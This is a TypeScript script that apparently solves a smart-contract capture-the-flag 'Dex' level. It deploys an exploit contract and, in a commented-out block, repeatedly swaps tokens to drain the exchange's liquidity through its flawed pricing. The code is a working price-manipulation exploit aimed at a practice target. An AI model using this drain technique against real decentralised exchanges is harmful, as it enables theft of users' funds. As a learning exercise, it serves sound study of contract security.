// Runtime Environment's members available in the global scope.
import { BigNumber, Signer, BytesLike } from "ethers";
import { getSigner } from "./signer";
import { DexOneExploit__factory, Dex__factory, ERC20__factory } from "../typechain";
import { createLevel, submitLevel } from './utils';
import { ethers } from "ethers";

async function main() {
  // const signer = (await ethers.getSigners())[0];
  const signer = getSigner();  
  const level = await createLevel(signer, "^Dex");
  
  // The answer would look like this https://www.wolframalpha.com/input?i=110*x%2F%28110-x%29.
  // Swap until reach final point. Which is half of dex liquid = 55. 
  // 110 is the max token that dex can hold when included player token.
  // when player token own more than half, we can swap for all token in dex.
  const dex = await (new Dex__factory(signer)).attach(level);

  const playerAddress = await signer.getAddress();
  
  console.log("allow dex to transfer my money");
  await dex.approve(dex.address, ethers.constants.MaxUint256, {gasLimit: 200000});
  
  const token1 = await dex.token1();
  const token2 = await dex.token2();
  console.log("swapping");
  
  const exploiter = (await new DexOneExploit__factory(signer).deploy(dex.address,{gasLimit:5000000}));
  await exploiter.deployed();
  console.log("approve exploiter");
  await dex.approve(exploiter.address, ethers.constants.MaxUint256, {gasLimit: 200000});
  console.log("exploiting");
  await exploiter.exploit({gasLimit: 3000000});
  
  // Below is my original answer without contract. idk how it work. It just work on localhardhat.
  // When test again on testnet, it just broke.
  // For some reason, transaction cannot be send through infura with swap function. So I recreate this with a contract instead.
  // const playerToken1Balance = async () => await dex.balanceOf(token1, playerAddress);
  // const playerToken2Balance = async () => await dex.balanceOf(token2, playerAddress);
  // const liquid1Balance = async () => await dex.balanceOf(token1, dex.address);
  // const liquid2Balance = async () => await dex.balanceOf(token2, dex.address);

  // // The way this hack work differ from the answer.
  // // As this use price skrew mechanism when liquid reach 0.
  // // To get better price after swap
  // while (true) {

  //   const liquid1 = await liquid1Balance();
  //   const liquid2 = await liquid2Balance();
  //   const t1b = await playerToken1Balance();
  //   const t2b = await playerToken2Balance();
  //   console.log("liquid1: ", liquid1.toString());
  //   console.log("liquid2: ", liquid2.toString());
  //   console.log("balance of token1: ", t1b.toString());
  //   console.log("balance of token2: ", t2b.toString());
  //   if (liquid1.isZero())
  //     break;
  //   else if (liquid2.isZero())
  //     break;

  //   if (t2b.gt(0)) {

  //     console.log("swap 2 to 1")
  //     let swapPrice = await dex.get_swap_price(token2, token1, t2b);
  //     const maxSwap = liquid1.mul(t2b).div(swapPrice);
  //     const swapAmount = maxSwap.gt(swapPrice) ? t2b : maxSwap;
  //     await (await dex.swap(token2, token1, swapAmount, { gasLimit: 500000 })).wait();
  //   }
  //   else if (t1b.gt(0)) {
  //     console.log("swap 1 to 2")
  //     let swapPrice = await dex.get_swap_price(token1, token2, t1b);
  //     const maxSwap = liquid2.mul(t1b).div(swapPrice);
  //     const swapAmount = maxSwap.gt(swapPrice) ? t1b : maxSwap;
  //     await (await dex.swap(token1, token2, swapAmount, { gasLimit: 500000 })).wait();
  //   }
  // }

  await submitLevel(signer, level);

}

main()
  .then(() => {
    console.log("Done!");
    process.exit(0);
  })
  .catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });
